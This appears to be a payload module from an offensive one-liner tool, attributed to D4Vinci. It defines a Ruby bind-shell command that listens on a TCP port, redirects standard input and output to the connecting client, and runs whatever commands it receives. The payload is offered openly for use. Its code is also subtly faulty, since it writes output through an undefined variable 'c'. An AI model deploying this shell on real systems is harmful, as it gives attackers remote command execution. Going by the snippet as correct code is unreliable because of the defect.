class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Uses ruby TCPServer to establish a bind shell."
    function    = "bind shell"
    liner       = """ruby -rsocket -e 'VAR1=TCPServer.new(PORT);VAR2=VAR1.accept;VAR1.close();$stdin.reopen(VAR2);$stdout.reopen(VAR2);$stderr.reopen(VAR2);$stdin.each_line{|VAR3|VAR3=VAR3.strip;next if VAR3.length==0;(IO.popen(VAR3,"rb"){|VAR4|VAR4.each_line{|VAR5|c.puts(VAR5.strip)}})rescue nil}'"""
